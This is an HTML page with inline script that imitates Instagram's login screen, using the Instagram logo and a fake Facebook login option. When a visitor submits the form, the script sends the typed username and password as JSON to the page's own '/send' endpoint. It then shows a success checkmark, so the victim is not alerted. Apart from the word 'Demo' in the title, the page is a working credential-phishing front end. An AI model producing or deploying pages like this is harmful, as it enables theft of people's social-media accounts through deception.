<!DOCTYPE html>
<html lang="uz">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Login Demo</title>

<!-- Font Awesome for icons -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<link rel="stylesheet" href="style.css">

<style>
/* ===== Extra Styles for Responsive Checkmark & Status ===== */
.success-logo {
    display: none;
    color: #4BB543;
    font-size: 70px;
    margin-bottom: 20px;
    transition: transform 0.3s ease-in-out;
    text-align: center;
}

/* Mobile adjustments */
@media (max-width: 400px) {
    .insta-logo img, .success-logo i {
        width: 60px;
        font-size: 60px;
    }

    input, button {
        padding: 10px 8px;
        font-size: 14px;
    }

    .status {
        font-size: 13px;
    }
}
</style>

</head>
<body>

<div class="container">
    <div class="login-box">
        <!-- Instagram logo -->
        <div class="insta-logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram Logo">
        </div>

        <!-- Success checkmark icon -->
        <div class="success-logo">
            <img src="https://cdn3d.iconscout.com/3d/premium/thumb/galochka-3d-icon-png-download-11169918.png" alt="Verified" id="checkmark-img">
        </div>

        <form id="form">
            <input type="text" id="username" placeholder="Mobile number,username or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>

        <div class="divider">OR</div>
        <div class="fb-login"><i class="fa-brands fa-facebook-square"></i> Log in with Facebook</div>
        <p class="status" id="status"></p>
    </div>

    <div class="signup-box">
        Don't have an account? <a href="#">Sign up</a>
    </div>
</div>

<script>
const form = document.getElementById("form");
const status = document.getElementById("status");
const instaLogo = document.querySelector(".insta-logo");
const successLogo = document.querySelector(".success-logo");

form.addEventListener("submit", async (e) => {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    try {
        const response = await fetch("/send", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username, password })
        });

        if(response.ok){
            // Instagram logoni yashirish
            instaLogo.style.display = "none";

            // Galochka logoni ko‘rsatish
            successLogo.style.display = "block";
            successLogo.style.transform = "scale(1.2)";
            setTimeout(() => { successLogo.style.transform = "scale(1)"; }, 300);

            // Formani tozalash
            form.reset();
        } else {
            status.style.color = "red";
            status.textContent = "❌ Server bilan bog‘lanib bo‘lmadi";
        }
    } catch(err){
        console.error(err);
        status.style.color = "red";
        status.textContent = "❌ Server bilan bog‘lanib bo‘lmadi";
    }
});
</script>

</body>
</html>
